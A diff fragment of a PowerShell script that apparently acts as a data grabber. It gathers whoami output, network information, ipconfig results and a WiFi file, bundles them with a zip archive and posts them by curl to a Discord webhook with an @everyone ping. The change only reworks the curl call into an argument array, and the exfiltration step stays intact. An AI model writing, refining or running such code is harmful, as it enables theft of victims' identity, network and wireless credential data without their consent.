@@ -39,18 +39,23 @@ $payload = @{
   content = "@everyone: $whoami_content | $networkInfo"
 } | ConvertTo-Json -Compress
 
-# Remove newlines from $networkInfo (they break JSON)
+# Fix newline breaks
 $payload = $payload -replace "\r?\n"," "
 
-# Wrap payload in quotes so curl sends it AS JSON STRING
+# Escape quotes + wrap for multipart
 $payload = '"' + $payload.Replace('"', '\"') + '"'
 
-& curl.exe -X POST `
-  -F "payload_json=$payload" `
-  -F "file1=@$zip" `
-  -F "file2=@${e}\ipcfg.txt" `
-  -F "file3=@$wifiFile" `
-  "$wh"   
+# Send to Discord
+$args = @(
+  '-X', 'POST',
+  '-F', "payload_json=$payload",
+  '-F', "file1=@$zip",
+  '-F', "file2=@${e}\ipcfg.txt",
+  '-F', "file3=@$wifiFile",
+  "$wh"
+)
+
+& curl.exe @args
 
 # cleanup
 #cls
